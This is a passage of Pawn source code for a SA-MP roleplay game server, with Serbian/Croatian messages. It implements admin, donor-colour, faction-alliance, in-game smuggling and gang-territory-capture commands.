    if( PlayerInvited[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozete komandu dok ste u eventu." );
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( IsPlayerInAnyVehicle( playerid ) )
	{
		RemovePlayerFromVehicle( playerid ); 
		UsaoAutoProdaja[ playerid ] = -1;

		SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);
	}
	return 1;
}

CMD:resetrob( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/resetrob [id]" );
		PlayerInfo[ id ][ xPljackaVreme ] = 0;

		SendInfoMessage( playerid, "Resetovao si rob igracu." );
		SendInfoMessage( id, "Admin vam je resetovao rob time." );
	}
	else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	return 1;
}

CMD:dboja( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 6 || PlayerInfo[ playerid ][ xDBO ] == 0) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	new str[1000];
	format(str, sizeof(str), 
       						"#\tBoja\tIzgled\n\
							{4282C0}(1).\tDefault\t{FFFFFF}%s\n\
							{4282C0}(2).\tLight Red\t{FA7373}%s\n\
							{4282C0}(3).\tRed\t{F01F1F}%s\n\
							{4282C0}(4).\tDark Red\t{941010}%s\n\
							{4282C0}(5).\tLight Orange\t{FA9973}%s\n\
							{4282C0}(6).\tOrange\t{F0611F}%s\n\
							{4282C0}(7).\tDark Orange\t{BA7900}%s\n\
							{4282C0}(8).\tLight Green\t{7AFA73}%s\n\
							{4282C0}(9).\tGreen\t{50F01F}%s\n\
							{4282C0}(10).\tDark Green\t{069602}%s\n\
							{4282C0}(11).\tLight Blue\t{73FAE1}%s\n\
							{4282C0}(12).\tBlue\t{1FAEF0}%s\n\
							{4282C0}(13).\tDark Blue\t{026096}%s\n\
							{4282C0}(14).\tLight Purple\t{A273FA}%s\n\
							{4282C0}(15).\tPurple\t{6F1FF0}%s\n\
							{4282C0}(16).\tDark Purple\t{4C0296}%s\n\
							{4282C0}(17).\tLight Pink\t{FA73EA}%s\n\
							{4282C0}(18).\tPink\t{F01FDF}%s\n\
							{4282C0}(19).\tDark Pink\t{B8007D}%s",
																ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid),
																ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid),
																ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), 
																ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid), ImeIgraca(playerid));
	ShowPlayerDialog( playerid, dialog_DONATORBOJA, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, str, "Odaberi", "Odustani");
	return 1;
}

CMD:donatorskeboje( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    new ID;
    if( sscanf( params, "u", ID ) ) return SendUsageMessage( playerid, "/donatorskeboje [id]");
	if( ID == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );

	if( !PlayerInfo[ ID ][ xDBO ] )
	{
		PlayerInfo[ ID ][ xDBO ] = 1;
	    sql_user_update_integer( ID, "dbo", PlayerInfo[ ID ][ xDBO ] );

		SendInfoMessage( ID, "Admin {FFFFFF}%s {4282C0}vam je aktivirao donatorske boje.", ImeIgraca( playerid ) );
	    SendInfoMessage( playerid, "Aktivirao si donatorske boje igracu {FFFFFF}%s.", ImeIgraca( ID ) );
	}
	else
	{
	    PlayerInfo[ ID ][ xDBO ] = 0;
	    SMG_SetPlayerColor( playerid );
	    sql_user_update_integer( ID, "dbo", PlayerInfo[ ID ][ xDBO ] );

		SendInfoMessage( ID, "Admin {FFFFFF}%s {4282C0}vam je deaktivirao donatorske boje.", ImeIgraca( playerid ) );
	    SendInfoMessage( playerid, "Deaktivirao si donatorske boje igracu {FFFFFF}%s.", ImeIgraca( ID ) );
	}
	return 1;
}

CMD:savezi( playerid )
{
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	for( new id = 1; id < MAX_ORG; id++)
	{
	    if( org_info[ id ][ oTip ] == ORG_TIP_BANDA || org_info[ id ][ oTip ] == ORG_TIP_MAFIJA || org_info[ id ][ oTip ] == ORG_TIP_BAJKERI )
		{
		    if( org_info[ id ][ oSavez ] == -1 )
			{
				format( globalstring, sizeof( globalstring ), "{FFFFFF}%s {FFAF00}nema saveznika.\n", org_info[ id ][ oName ] );
				strcat( DialogStrgEx, globalstring );

		    }
			else
			{
			    format( globalstring, sizeof( globalstring ), "{FFFFFF}%s {FFAF00}u savezu sa {FFFFFF}%s.\n", org_info[ id ][ oName ], org_info[ org_info[ id ][ oSavez ] ][ oName ] );
				strcat( DialogStrgEx, globalstring );
			}
		}
	}

	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}

CMD:prekinisavez( playerid )
{
	if( PlayerInfo[ playerid ][ xLider ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu(samo lider)." );

    if( GetFactionType( playerid ) == ORG_TIP_VLADINA ||
        GetFactionType( playerid ) == ORG_TIP_HITMAN )
	{
		SendErrorMessage( playerid, "Vasa organizacija nema razloga prekidati saveze.");
		return 1;
	}

	if( org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] == -1 ) return SendErrorMessage( playerid, "Vasa organizacija nije u savezu." );

	new savezOrga = org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ];

	if( savezOrga != -1 )
	{
	    org_info[ savezOrga ][ oSavez ] = -1;
	    sql_organization_update_integer( savezOrga, "savez", org_info[ savezOrga ][ oSavez ] );
	}

	org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] = -1;
	sql_organization_update_integer( PlayerInfo[ playerid ][ xClan ], "savez", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] );

	SendInfoMessage( playerid, "Prekinuli ste savez sa drugom organizacijom." );
    return 1;
}


CMD:sa( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete pisati dok ste u jailu / prisonu.");

	new str[ 144 ];
	if( sscanf( params, "s[128]", str ) ) return SendUsageMessage( playerid, "/sa [text]");

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( str, ZabranjeneReci[ b ], true ) != -1 )
		{
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - CMD /sa: %s[%d]: %s", ImeIgraca( playerid ), playerid, str );
       		break;
        }
	}

	if( PlayerInfo[ playerid ][ xLider ] > 0 || PlayerInfo[ playerid ][ xClan ] > 0 )
	{
        if( org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] == -1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu, jer nemate sklopljen savez." );

	    if( PlayerInfo[ playerid ][ xRank ] == 5 ) format(str, sizeof(str), "[%s] %s: {FFFFFF}%s.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], ImeIgraca( playerid ), str );
	    else if( PlayerInfo[ playerid ][ xRank ] == 6 ) format(str, sizeof(str), "[%s] %s: {FFFFFF}%s.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], ImeIgraca( playerid ), str );
		else return SendErrorMessage( playerid, "Samo rank 5 i 6 mogu koristiti ovu komandu." );

		if( org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] != -1 )
		{
			foreach( new i : Player)
			{
			    if( ( PlayerInfo[ i ][ xClan ] == PlayerInfo[ playerid ][ xClan ] || PlayerInfo[ i ][ xClan ] == org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] ) && PlayerInfo[ i ][ xRank ] >= 5 )
				{
			    	SendClientMessage( i, 0x7EF2FAFF, str );
				}
			}
		}
	}
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:savez( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xLider ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu(samo lider)." );

    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || GetFactionType( playerid ) == ORG_TIP_HITMAN )
	{
		SendErrorMessage( playerid, "Vasa organizacija nema razloga sklapati saveze.");
		return 1;
	}

	new id;
    if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/savez [id]");

	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID igraca." );
    if( PlayerInfo[ id ][ xLider ] < 1 ) return SendErrorMessage( playerid, "Izabrani igrac nije lider." );
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi." );
    if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Taj igrac nije blizu vas !");

    if( GetFactionType( id ) == ORG_TIP_VLADINA ||
        GetFactionType( id ) == ORG_TIP_HITMAN )
	{
		SendErrorMessage( playerid, "Organizacija izabranog lidera nema razloga sklapati saveze.");
		return 1;
	}

	if( org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] != -1 ) return SendErrorMessage( playerid, "Vasa organizacija je vec u savezu sa nekim." );
    if( org_info[ PlayerInfo[ id ][ xClan ] ][ oSavez ] != -1 ) return SendErrorMessage( playerid, "Organizacija izabranog lidera je vec u savezu sa drugom organizacijom." );

	GlobalProdaja[ id ] = playerid;
	format( globalstring, sizeof( globalstring ), "{FFFFFF}> %s\n{FFAF00}Lider {FFFFFF}%s {FFAF00}vam je ponudio savez.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oName ], ImeIgraca( playerid ) );
	ShowPlayerDialog( id, dialog_SAVEZ, DIALOG_STYLE_MSGBOX, "{FFFFFF}Zahtev za savez:", globalstring, "Prihvati", "Odbij" );
    return 1;
}

CMD:svercmatsa( playerid )
{
    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dva puta poceti sverc, prvo zavrsi jedan." );
	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA )
	{
		if( PlayerInfo[ playerid ][ xSvercer ] != 0 ) return SendErrorMessage( playerid, "Moras cekati jos %d minuta da bi mogao svercati opet.", PlayerInfo[ playerid ][ xSvercer ] );

        if( !IsVehicleC1( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Morate biti u kombiju nekom za prevoz" );

		CheckpointStatus[ playerid ] = 39;
		SMG_SetPlayerCheckpoint( playerid, -736.0009, -124.1893, 58.8809, 2.0 );
		SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Odite na oznacenu lokaciju kako bi pokupili materijale." );
		ProcesSvercanja[ playerid ] = 1;
	}
	else return SendErrorMessage( playerid, "Samo mafije." );
    return 1;
}

CMD:svercdroge( playerid )
{
    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dva puta poceti sverc, prvo zavrsi jedan." );
	if( GetFactionType( playerid ) == ORG_TIP_BANDA )
	{
		if( PlayerInfo[ playerid ][ xSvercer ] != 0 ) return SendErrorMessage( playerid, "Moras cekati jos %d minuta da bi mogao svercati opet.", PlayerInfo[ playerid ][ xSvercer ] );

        if( !IsVehicleC1( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Morate biti u kombiju nekom za prevoz" );

		CheckpointStatus[ playerid ] = 39;
		SMG_SetPlayerCheckpoint( playerid, 215.8650, 14.3710, 2.5708, 2.0 );
		SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Odite na oznacenu lokaciju kako bi pokupili drogu." );
		ProcesSvercanja[ playerid ] = 1;
	}
	else return SendErrorMessage( playerid, "Samo bande." );
    return 1;
}

CMD:prekinisverc( playerid )
{
    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA )
	{
		if( ProcesSvercanja[ playerid ] == 0 ) return SendErrorMessage( playerid, "Niste poceli sverc." );

        if( IDVozilaKojimSverca[ playerid ] != -1 ) KutijaMatsa[ IDVozilaKojimSverca[ playerid ] ] = false;
        IDVozilaKojimSverca[ playerid ] = -1;

		CheckpointStatus[ playerid ] = 0;
		SMG_DisablePlayerCheckpoint( playerid );

		SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Prekinuli ste sa svercom, sledeci put mozete za 5min." );

        PlayerInfo[ playerid ][ xSvercer ] = 5;

		ProcesSvercanja[ playerid ] = 0;
	}
	else return SendErrorMessage( playerid, "Samo mafije i bande." );
    return 1;
}

CMD:ubaciukombi( playerid )
{
	if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA )
	{
		if( !IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_NONVEHICLE ) ) return SendErrorMessage( playerid, "Nemate kutiju u rukama!");

		if( ProcesSvercanja[ playerid ] != 3 ) return SendErrorMessage( playerid, "Nemate kutiju u rukama!");

	    new vehicleid = getPlayerNearestTractor( playerid ), orgID = PlayerInfo[ playerid ][ xClan ];
		if( vehicleid == IVI ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );
        if( KutijaMatsa[ vehicleid ] ) return SendErrorMessage( playerid, "Ovde vec ima ubacena jedna kutija." );

	    new Float:vehPosX, Float:vehPosY, Float:vehPosZ;
		getPosBehindVehicle( vehicleid, vehPosX, vehPosY, vehPosZ, 0.0 );
		if( !IsPlayerInRangeOfPoint( playerid, 4, vehPosX, vehPosY, vehPosZ ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

        if( !IsVehicleC1( vehicleid ) ) return SendErrorMessage( playerid, "Morate biti u kombiju nekom za prevoz" );

        ProcesSvercanja[ playerid ] = 4;

		RemovePlayerAttachedObject( playerid, OBJECT_SLOT_NONVEHICLE );

		if( org_info[ orgID ][ oEntFromBussines ] != -1 )
		{
        	new bussines_id = org_info[ orgID ][ oEntFromBussines ];
        	SMG_SetPlayerCheckpoint( playerid, BusinessInfo[ bussines_id ][ bEnterX ], BusinessInfo[ bussines_id ][ bEnterY ], BusinessInfo[ bussines_id ][ bEnterZ ], 2.0 );
        }
		else
		{
			SMG_SetPlayerCheckpoint( playerid, org_info[ orgID ][ oPozExtX ], org_info[ orgID ][ oPozExtY ], org_info[ orgID ][ oPozExtZ ], 2.0 );
		}

		CheckpointStatus[ playerid ] = 39;

        IDVozilaKojimSverca[ playerid ] = vehicleid;
		KutijaMatsa[ vehicleid ] = true;

		SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Ubacili ste kutiju , idite da istovarite do baze.");
	    SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Kada stignete izvadite kutiju iz kombija komandom {FFFFFF}[ /izvadikutiju ]." );
		SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): I sa kutijom u rukama stanite na marker.");

		ApplyAnimation( playerid, "CARRY", "putdwn", 3.0, 0, 0, 0, 0, 0 );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:izvadikutiju( playerid )
{
	if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA )
	{
		if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_NONVEHICLE ) ) return SendErrorMessage( playerid, "Vec imas kutiju u rukama!");

		if( ProcesSvercanja[ playerid ] != 4 ) return SendErrorMessage( playerid, "Niste ubacili kutiju u kombi!");

	    new vehicleid = getPlayerNearestTractor( playerid );
        if( vehicleid == IVI ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );
        if( !KutijaMatsa[ vehicleid ] ) return SendErrorMessage( playerid, "U ovom vozilu nema ubacene kutije." );

	    new Float:vehPosX, Float:vehPosY, Float:vehPosZ;
		getPosBehindVehicle( vehicleid, vehPosX, vehPosY, vehPosZ, 0.0 );
		if( !IsPlayerInRangeOfPoint( playerid, 2, vehPosX, vehPosY, vehPosZ ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

		if( !IsVehicleC1( vehicleid ) ) return SendErrorMessage( playerid, "Morate biti u kombiju nekom za prevoz" );

        ProcesSvercanja[ playerid ] = 5;

        IDVozilaKojimSverca[ playerid ] = -1;
		KutijaMatsa[ vehicleid ] = false;

		SetPlayerAttachedObject( playerid, OBJECT_SLOT_NONVEHICLE, 3052, 1, 0.15, 0.4, 0.0, 0.0, 90.0, 0.0, 1.0, 1.0, 1.0 );

		SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Izvadili ste kutiju , idite da istovarite na marker.");

		ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1 );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:zreset(playerid)
{
	if(PlayerInfo[playerid][xAdmin] != 7) return SendErrorMessage( playerid, "Upisali ste komandu koja ne postoji, kucajte {FFFFFF}[ /help ] {FF0000}da vidite listu komandi.");
	PlayerInfo[ playerid ][ xZauzimanjeVreme ] = 0;
	return 1;
}

CMD:zauzmi( playerid )
{
    if( GetFactionType( playerid ) != ORG_TIP_BANDA && GetFactionType( playerid ) != ORG_TIP_MAFIJA ) return SendErrorMessage( playerid, "Samo bande i mafije mogu koristiti ovu komandu." );
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes da zauzimas sa vozila." );
    if( PlayerInfo[ playerid ][ xZauzimanjeVreme ] != 0 ) return SendErrorMessage( playerid, "Vec ste zauzimali, sacekajte jos %d minuta.", PlayerInfo[ playerid ][ xZauzimanjeVreme ] );

	new gZone__ID = GetNearestGZone( playerid );
	if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti u teritoriji da bi je zauzeo." );
	if( !gZoneInfo[ gZone__ID ][ gZoneTakeable ] ) return SendErrorMessage( playerid, "Ovu teritoriju nije moguce zauzeti." );
	if( PlayerInfo[ playerid ][ xClan ] == gZoneInfo[ gZone__ID ][ gZoneGangID ] ) return SendErrorMessage( playerid, "Ne mozes zauzeti teritoriju koja je u vlasnistvu tvoje bande." );
	if( gZoneInfo[ gZone__ID ][ gZoneTime ] != 0 ) return SendErrorMessage( playerid, "Ovo je vec neko zauzimao u skorije vreme." );

	if( !IsPlayerInRangeOfPoint( playerid, 10.0, gZoneInfo[ gZone__ID ][ gZonePickup_X ], gZoneInfo[ gZone__ID ][ gZonePickup_Y ], gZoneInfo[ gZone__ID ][ gZonePickup_Z ] ) ) return SendErrorMessage( playerid, "Morate biti na pickupu te teritorije da bi zapoceli zauzimanje." );

	new Orga = 0, Protiv = 0, teammates = 0, Float:Pos[3], hour, minute, seconds;
	gettimeEx( hour, minute, seconds );
	FixHour( hour );
	hour = shifthour;
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

	foreach( new i : Player)
	{
	    if( gZoneInfo[ gZone__ID ][ gZoneGangID ] != -1 )
		{
			if( PlayerInfo[ i ][ xClan ] == gZoneInfo[ gZone__ID ][ gZoneGangID ] ) Protiv++;
		}

 	    if( PlayerInfo[ i ][ xClan ] == PlayerInfo[ playerid ][ xClan ] )
		{
			Orga++;
			if(i != playerid && IsPlayerInRangeOfPoint(i, 150.0, Pos[0], Pos[1], Pos[2])) teammates++;
		}
	}

    if( GetWeapon( playerid ) >= 22 && GetWeapon( playerid ) <= 40 )
	{
        if( ( hour >= 09 ) && ( hour <= 23 ) )
		{
			if( Orga < 3 ) return SendErrorMessage( playerid, "Moras imati bar 3 clana iz bande online da bi zauzeo neku teritoriju." );
		    if( gZoneInfo[ gZone__ID ][ gZoneGangID ] != -1 )
			{
                OrgPoruka( gZoneInfo[ gZone__ID ][ gZoneGangID ], 0x95B4A2FF, "(TERITORIJA): Druga organizacija pokusava da zauzme vasu teritoriju." );
			}

			new stringic[ 24 ];
            format( stringic, sizeof( stringic ), "0x%s99", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oColor ] );

			ZoneFlashForAll( gZoneInfo[ gZone__ID ][ gZoneID ], HexToInt( stringic ) );

			SendClientMessage( playerid, 0xFF4500FF, "(ZAUZIMANJE): Zapoceli ste zauzimanje teritorije." );
			SendClientMessage( playerid, 0xFF4500FF, "(ZAUZIMANJE): Morate ostati zivi sledecih 10 minuta kako bi je osvojili." );
			SendClientMessage( playerid, 0xFF4500FF, "(ZAUZIMANJE): Ne smete se previse udaljiti od mesta zauzimanja jer ce zauzimanje biti prekinuto.");
			DodajWarnRed("~p~(ZAUZIMANJE) %s(%d) ~w~je zapoce%s zauzimanje teritorije ~p~ID %d ~w~sa ~p~%d ~w~saucesnika.", ImeIgraca(playerid), playerid, getPolForString(playerid, "o", "la"), gZone__ID, teammates);

			CreateZauzimanjeTDs(playerid, true);

			gZoneInfo[ gZone__ID ][ gZoneTime ] = 30;

			gZone_gID[ playerid ] = gZone__ID;
			gZone_Time[ playerid ] = 450;
			gZone_ShowTeammates[ playerid ] = 1;
			gZone_Timer[playerid] = SetPlayerTimerEx(playerid, "ZonaZauzmi", 1000, true, "i", playerid);

			PlayerInfo[ playerid ][ xZauzimanjeVreme ] = 30;

			OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x95B4A2FF, "(TERITORIJA): Clan vase organizacije pokusava da zauzme tudju teritoriju." );
		}
		else return SendErrorMessage( playerid, "Mozete zauzimati teritorije samo od 9h do 23h." );
	}
 	else return SendErrorMessage( playerid, "Nemate oruzje za zauzimanje teritorije!" );
	return 1;
}

_:public ZonaZauzmi( playerid ) 
{
	new string[ 128 ];
	if(IsPlayerInRangeOfPoint(playerid, 10.0, gZoneInfo[gZone_gID[playerid]][gZonePickup_X], gZoneInfo[gZone_gID[playerid]][gZonePickup_Y], gZoneInfo[gZone_gID[playerid]][gZonePickup_Z])) 
	{
	    if(gZone_ShowTeammates[playerid] > 0) gZone_ShowTeammates[playerid]--;
	    else 
	    {
	        new Float:Pos[3], suigraciuzoni = 0;
			GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
			foreach(new i : Player) 
			{
	            if(IsPlayerInRangeOfPoint(i, 100.0, Pos[0], Pos[1], Pos[2]))
	            {
	                if(PlayerInfo[playerid][xClan] == PlayerInfo[i][xClan] && i != playerid) suigraciuzoni++;
	            }
	        }
	        format( string, sizeof( string ), "TEAMMATES_IN_100m:_%d", suigraciuzoni );
	        PlayerTextDrawSetString(playerid, Zauzimanje_pTD[playerid][4], string);
	        if(!TogHud[playerid]) PlayerTextDrawShow(playerid, Zauzimanje_pTD[playerid][4]);
	        gZone_ShowTeammates[playerid] = 10;
	    }

	    //--

	    if( gZone_Time[ playerid ] > 0 ) 
	    {
	        format( string, sizeof( string ), "%03d sec", gZone_Time[ playerid ] );
	        PlayerTextDrawSetString(playerid, Zauzimanje_pTD[playerid][5], string);
	        if(!TogHud[playerid]) PlayerTextDrawShow(playerid, Zauzimanje_pTD[playerid][5]);

	        gZone_Time[ playerid ]--;

	        new Float:Value = GetPlayerProgressBarValue(playerid, ZauzimanjeBar_pTD[playerid]);
	        SetPlayerProgressBarValue( playerid, ZauzimanjeBar_pTD[playerid], Value+0.169 );
	    }
	    else if( gZone_Time[ playerid ] == 0 ) 
	    {
	        ZoneStopFlashForAll( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneID ] );
	        HideZoneForAll( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneID ] );

	        gZone_Time[ playerid ] = 0;
	        gZone_ShowTeammates[ playerid ] = 1;
	        KillTimer(gZone_Timer[playerid]);

	        OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, "(TERITORIJA): Vasa organizacija je prosirila svoju vladavinu na jos jednu teritoriju." );

	        if( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangID ] != -1 )
			{ 
                OrgPoruka( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangID ], 0x95b4a2FF, "(TERITORIJA): Suparnicka org %s je preuzela jednu od vasih teritorija.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );
            	OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x95b4a2FF, "(TERITORIJA): Clan %s je zauzeo teritoriju koju je kontrolisala organizacija %s.", ImeIgraca( playerid ), org_info[ gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangID ] ][ oName ] );
			}
			else if( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangID ] == -1 )
			{ 
            	OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x95b4a2FF, "(TERITORIJA): Clan %s je zauzeo teritoriju koja je bila slobodna.", ImeIgraca( playerid ) );
			}


			gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangID ] = PlayerInfo[ playerid ][ xClan ];
			gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangSQLID ] = org_info[ PlayerInfo[ playerid ][ xClan ] ][ oID ];
			gZoneInfo[ gZone_gID[ playerid ] ][ gZoneTaken ] = 1;

			new stringic[ 24 ];
            format( stringic, sizeof( stringic ), "%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oColor ] );
            strmid( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneColor ], stringic, 0, strlen( stringic ), 7 );

			format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ gZone_gID[ playerid ] ][ gZoneColor ] );
            ShowZoneForAll( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneID ], HexToInt( stringic ) );

			GZone_Refresh( gZone_gID[ playerid ] );

			gZoneInfo[ gZone_gID[ playerid ] ][ gZoneTime ] = 30;

			new q[ 256 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `taken` = '%d', `gang_id` = '%d', `time` = '%d', `color` = '%s' WHERE `gzone_id` = '%d'",
												gZoneInfo[ gZone_gID[ playerid ] ][ gZoneTaken ],
												gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangSQLID ],
												gZoneInfo[ gZone_gID[ playerid ] ][ gZoneTime ],
												gZoneInfo[ gZone_gID[ playerid ] ][ gZoneColor ],
												gZoneInfo[ gZone_gID[ playerid ] ][ gZone_ID ] );

		   	mysql_tquery( mSQL, q );

            PostaviWanted( playerid, "Zauzimanje Teritorija", "Nepoznati", 10 );

            gZone_gID[ playerid ] = -1;

            CreateZauzimanjeTDs(playerid, false);
		}
	}
	else 
	{
        GameTextForPlayer( playerid, "~w~Previse ste se udaljili~n~~r~zauzimanje_se_prekida!", 5000, 4);
        ZoneStopFlashForAll( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneID ] );
	    gZone_Time[ playerid ] = 0;
	    gZone_ShowTeammates[ playerid ] = 1;
	    KillTimer(gZone_Timer[playerid]);

	    PostaviWanted( playerid, "Zauzimanje Teritorija", "Nepoznati", 10 );

        if( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangID ] != -1 )
		{ 
            OrgPoruka( gZoneInfo[ gZone_gID[ playerid ] ][ gZoneGangID ], 0x95b4a2FF, "(TERITORIJA): Suparnicka org %s se previse udaljila od pickupa teritorije i prestala sa preuzimanjem.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );
		}
 
        OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x95b4a2FF, "(TERITORIJA): Clan %s se previse udaljio od pickupa teritorije i prestao sa zauzimanjem.", ImeIgraca( playerid ) );

        gZoneInfo[ gZone_gID[ playerid ] ][ gZoneTime ] = 30;

        new q[ 100 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `time` = '%d' WHERE `gzone_id` = '%d'",
											gZoneInfo[ gZone_gID[ playerid ] ][ gZoneTime ],
											gZoneInfo[ gZone_gID[ playerid ] ][ gZone_ID ] );

		mysql_tquery( mSQL, q );

        gZone_gID[ playerid ] = -1;

        CreateZauzimanjeTDs(playerid, false);
	}
	return 1;
}

_:public CreateZauzimanjeTDs( playerid, bool:show )
{
	if( show == true )
	{
		Zauzimanje_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 469.555541, 274.124237, "box");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][0], 0.000000, 4.577775);
